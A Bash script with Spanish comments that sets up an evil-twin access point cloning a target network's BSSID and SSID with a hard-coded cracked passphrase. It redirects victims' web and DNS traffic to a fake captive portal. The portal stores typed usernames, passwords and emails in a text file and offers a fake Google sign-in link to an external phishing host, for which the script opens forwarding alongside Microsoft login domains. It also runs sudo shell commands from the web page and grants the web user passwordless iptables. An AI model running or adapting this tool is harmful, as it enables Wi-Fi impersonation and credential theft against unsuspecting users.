#!/bin/bash
SELECTED_INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"
INTERFACE_INTERNET_OUTPUT="eth0"

BSSID_VAR="D4:60:E3:C0:D8:36"
CHANNEL_VAR="11"
PRIVACY_VAR="WPA2 WPA"
CIPHER_VAR="CCMP TKIP"
AUTH_VAR="PSK"
BEACONS_VAR=""
ESSID_VAR="PI_WIFI_TEST"

PASSWORD_CRACKED="A123456789a!"


FILE_isc="isc-dhcp-server"
DIRECTORY="./templates/"
DIR_WEB=/var/www/html/
FILE_dhcp="dhcpd.conf"

activate_dhcp(){

    
    FILE_isc="isc-dhcp-server"
    DIRECTORY="./templates/"
    FILE_dhcp="dhcpd.conf"
    
    echo "INTERFACESv4=\"${SELECTED_INTERFACE}\"" > "${DIRECTORY}${FILE_isc}"
    echo 'INTERFACESv6=""' >> "${DIRECTORY}${FILE_isc}"

    sudo cp "${DIRECTORY}${FILE_isc}" /etc/default/
    

    cat <<EOF > "${DIRECTORY}${FILE_dhcp}"
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.15 192.168.1.200;
    option routers 192.168.1.1;
    option domain-name-servers 1.1.1.1,8.8.8.8;
    option broadcast-address 192.168.1.255;
    default-lease-time 600;
    max-lease-time 7200;
}
EOF

    sudo cp "${DIRECTORY}${FILE_dhcp}" /etc/dhcp/
    
    if sudo systemctl restart isc-dhcp-server ; then
        echo "Succesful DHCP Server"
        return 0
    else
        echo "Error on DHCP Server"
        return 1
    fi
    # sudo journalctl -fu isc-dhcp-server ( Ver en tiempo real el DHCP)
}

activate_dns(){

    FILE_dns="dnsmasq.conf"
    DIRECTORY="./templates/"

    cat <<EOF > "${DIRECTORY}${FILE_dns}"
no-resolv
interface=$SELECTED_INTERFACE
bind-interfaces
log-queries
log-facility=/var/log/dnsmasq.log


address=/connectivitycheck.gstatic.com/192.168.1.1
address=/clients3.google.com/192.168.1.1
address=/capcha.apple.com/192.168.1.1
address=/msftconnecttest.com/192.168.1.1


server=8.8.8.8

EOF

}

ask_interface_out(){
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

    #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo "Select a network interface to take the traffic outside:"
    for i in "${!INTERFACES[@]}"; do
        echo "$((i+1)). ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted to take the traffic outside: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi

    # Obtener la interfaz seleccionada
    INTERFACE_OUTPUT="${INTERFACES[CHOICE-1]}"
    echo "INTERFACE output is : $INTERFACE_OUTPUT"
}

rules_iptables_ipforward(){
    sudo sysctl -w net.ipv4.ip_forward=1
    
    sudo iptables -t nat -A POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Permitir tráfico hacia microsoft.sagnier.ddns.net (si es necesario)
    iptables -I FORWARD -d microsoft.sagnier.ddns.net -j ACCEPT

    # Interfaz de salida a Internet desde IPFire (ajústala si no es eth0)
INTERFAZ_SALIDA="eth0"

# Lista de dominios Microsoft necesarios para login
DOMINIOS_MICROSOFT=(
    login.microsoftonline.com
    login.live.com
    aadcdn.msftauth.net
    aadcdn.msauth.net
    secure.aadcdn.microsoftonline-p.com
    c.bing.com
    c.bing.net
    nexus.officeapps.live.com
    officeclient.microsoft.com
    static2.sharepointonline.com
    res.cdn.office.net
    res-1.cdn.office.net
    res-hash.cdn.office.net
    browser.pipe.aria.microsoft.com
    logincdn.msauth.net
    graph.microsoft.com
    outlook.office365.com
    onedrive.live.com
    teams.microsoft.com
)

# Permitir tráfico TCP 443 hacia cada dominio
for dominio in "${DOMINIOS_MICROSOFT[@]}"; do
    ip=$(getent ahosts $dominio | grep -m 1 "STREAM" | awk '{ print $1 }')
    if [ -n "$ip" ]; then
        echo "Agregando regla para $dominio ($ip)..."
        iptables -I FORWARD -d $ip  -j ACCEPT
    else
        echo "No se pudo resolver $dominio"
    fi
done
    
    # --- REGLAS NUEVAS ---
    # 1. Permitir tráfico hacia la IP 188.84.123.116 ANTES del bloqueo general
    iptables -I FORWARD -d 188.84.123.116 -j ACCEPT

    # 2. Bloquear el resto del tráfico de clientes (excepto portal cautivo)
    sudo iptables -A FORWARD -i wlan0 -o eth0 -p tcp --dport 80 -j REJECT
    sudo iptables -A FORWARD -i wlan0 -o eth0 -p tcp --dport 443 -j REJECT

    # --- REGLAS DE REDIRECCIÓN (portal cautivo) ---
    # Eximir 188.84.123.116 del NAT (para que no sea redirigida al portal)
    iptables -t nat -I PREROUTING -d 188.84.123.116 -j RETURN
    
    # Redirigir HTTP/HTTPS al portal cautivo (192.168.1.1)
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443

    # Redirigir DNS (UDP/TCP) al portal
    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
    iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53
}

cleanup() {
    echo "[+] Restaurando configuración de red..."


    # Eliminar la regla NAT de POSTROUTING
    sudo iptables -t nat -D POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE

    # Eliminar la regla de REJECT para bloquear tráfico de clientes (excepto portal cautivo)
    sudo iptables -D FORWARD -i wlan0 -o eth0 -j REJECT


    # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
    sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443

    # Eliminar la regla de redirección DNS UDP (puerto 53) a 192.168.1.1
    iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53

    sudo sysctl -w net.ipv4.ip_forward=0
    echo "[+] Reglas de iptables eliminadas. Saliendo..."

    sudo ip addr del 192.168.1.1/24 dev $SELECTED_INTERFACE

    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type managed
    sudo ip link set $SELECTED_INTERFACE up

    sudo systemctl stop isc-dhcp-server
    sudo iptables -F FORWARD

    sudo rm "${DIRECTORY}${FILE_isc}"
    sudo rm "${DIRECTORY}${FILE_dhcp}"
}



create_fake_captive_portal(){

    cat <<EOF > "${DIRECTORY}index.php"
<?php
// Configuración
\$portal_url = "https://192.168.1.1/index.php";
\$essid = "${ESSID_VAR}";

// Detectar si el cliente ya está autenticado
if (isset(\$_COOKIE['auth']) && \$_COOKIE['auth'] === 'ok') {
    // Responder a comprobaciones de sistema operativo con "éxito"
    if (strpos(\$_SERVER['REQUEST_URI'], '/generate_204') !== false) {
        http_response_code(204);  // Android
        exit;
    }

    if (strpos(\$_SERVER['REQUEST_URI'], 'hotspot-detect.html') !== false) {
        echo "Success";  // Apple
        exit;
    }

    if (strpos(\$_SERVER['REQUEST_URI'], 'connecttest.txt') !== false) {
        echo "Microsoft Connect Test";  // Windows
        exit;
    }
}

// Detección mejorada
\$userAgent = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
\$requestUri = strtolower(\$_SERVER['REQUEST_URI'] ?? '');

\$captive_checks = [
    'captivenetworksupport',
    'wispr',
    'android',
    'microsoft ncsi',
    'ms-office',
    'xbox'
];

\$test_paths = [
    '/generate_204',
    '/hotspot-detect.html',
    '/ncsi.txt',
    '/connecttest.txt',
    '/connectivity-check.html'
];

if (in_array(\$requestUri, \$test_paths)) {
    header("Location: \$portal_url");
    exit;
}

foreach (\$captive_checks as \$check) {
    if (strpos(\$userAgent, \$check) !== false) {
        header("Location: \$portal_url");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required - <?php echo htmlspecialchars(\$essid); ?></title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="portal">
        <h1>WiFi Login - <?php echo htmlspecialchars(\$essid); ?></h1>
        <form action="/register.php" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Connect</button>
        </form>
        <a class="google-btn" href="https://microsoft.sagnier.ddns.net/FAZcbDEg">
        <img class="google-icon" src="https://developers.google.com/identity/images/g-logo.png" alt="Google logo">
        Iniciar sesión con Google
        </a>
    </div>
</body>
</html>
EOF

    cat <<EOF > "${DIRECTORY}style.css"
body {
    font-family: Arial, sans-serif;
    background: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.portal {
    background: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
    width: 300px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 4px;
}

button {
    background: #007bff;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
}

button:hover {
    background: #0056b3;
}
.google-btn {
    display: inline-flex;
    align-items: center;
    background-color: #fff;
    color: #444;
    border: 1px solid #ddd;
    font-size: 16px;
    padding: 10px 15px;
    border-radius: 4px;
    text-decoration: none;
    font-family: Roboto, sans-serif;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.google-btn:hover {
    box-shadow: 0 0 6px rgba(66, 133, 244, 0.5);
}

.google-icon {
    width: 20px;
    height: 20px;
    margin-right: 10px;
}
EOF

    cat <<'EOF' > "${DIRECTORY}register.php"
<?php
// Mostrar errores en desarrollo
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Ruta al archivo donde guardar credenciales
$file = '/var/www/html/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');
    $email = htmlspecialchars($_POST['email'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];

    $data = "$username:$password:$email\n";

    // Guardar datos
    file_put_contents($file, $data, FILE_APPEND);

    // Permitir tráfico a la IP
    shell_exec("sudo iptables -D FORWARD -s $ip -j ACCEPT 2>/dev/null");
    shell_exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -j RETURN");
    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -j RETURN");

    // Establecer cookie de autenticación (válida 1 hora)
    setcookie("auth", "ok", time()+3600, "/");

    // Redirigir a una ruta que active cierre automático del portal
    header("Location: /generate_204");
    exit();
} else {
    header("HTTP/1.1 400 Bad Request");
    echo "Método no permitido";
    exit();
}
?>
EOF
}

move_files_created(){

    cp "${DIRECTORY}index.php" "${DIR_WEB}index.php"
    cp "${DIRECTORY}style.css" "${DIR_WEB}style.css"
    cp "${DIRECTORY}register.php" "${DIR_WEB}register.php"

    sudo touch /var/www/html/creds.txt
    sudo chmod 664 /var/www/html/creds.txt
    sudo chown www-data:www-data /var/www/html/creds.txt

}


false_ap(){

    

    #Deauther 15 &

    if echo "$PRIVACY_VAR" | grep -q "WPA2 WPA"; then 
        WPA=3
    elif echo "$PRIVACY_VAR" | grep -q "WPA2"; then
        WPA=2
    elif echo "$PRIVACY_VAR" | grep -q "WPA"; then
        WPA=1
    else
        WPA=0  # AP Abierto o WEP (no recomendado)
    fi

    if echo "$AUTH_VAR" | grep -q "PSK"; then
        WPA_KEY_MGMT="WPA-PSK"
    elif echo "$AUTH_VAR" | grep -q "EAP"; then
        WPA_KEY_MGMT="WPA-EAP"
    else
        WPA_KEY_MGMT=""  # Red abierta
    fi

    if echo "$CIPHER_VAR" | grep -q "CCMP" && echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="CCMP TKIP"
    elif echo "$CIPHER_VAR" | grep -q "CCMP"; then
        RSN_PAIRWISE="CCMP"
    elif echo "$CIPHER_VAR" | grep -q "TKIP"; then
        RSN_PAIRWISE="TKIP"
    else
        RSN_PAIRWISE=""  # Red abierta o WEP
    fi

    cat <<EOF > hostapd.conf
interface=$SELECTED_INTERFACE
driver=nl80211
ssid=$ESSID_VAR
bssid=$BSSID_VAR
hw_mode=g
channel=$CHANNEL_VAR
macaddr_acl=0
auth_algs=1
EOF

if [ -n "$PASSWORD_CRACKED" ] && [ "$WPA" -gt 0 ]; then
    cat <<EOF >> hostapd.conf
wpa=$WPA
wpa_passphrase=$PASSWORD_CRACKED
wpa_key_mgmt=$WPA_KEY_MGMT
rsn_pairwise=$RSN_PAIRWISE
EOF
else
    # Forzar red abierta manteniendo el mismo SSID y BSSID
    cat <<EOF >> hostapd.conf
wpa=0
ignore_broadcast_ssid=0
EOF
fi

    echo "Done hostapd.conf Correctly."
   

    sudo ip link set $SELECTED_INTERFACE down
    sudo iw dev $SELECTED_INTERFACE set type ap
    sudo ip link set $SELECTED_INTERFACE up
    #En caso que el usuario tenga ya una ip en la interfaz wifi
    sudo ip addr flush dev wlan0
    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE

    #Puede tener conflictos con hostapd
    #sudo systemctl stop NetworkManager 
    #sudo systemctl stop wpa_supplicant 
    #sudo airmon-ng check kill

    if ! activate_dhcp; then 
        echo "Error"
        exit 1
    fi
    ask_interface_out
    #cleanup
    rules_iptables_ipforward
    sudo hostapd hostapd.conf #-B for broadcast

}
create_fake_captive_portal
move_files_created
false_ap
trap cleanup EXIT



#sudo visudo
#www-data ALL=(ALL) NOPASSWD: /sbin/iptables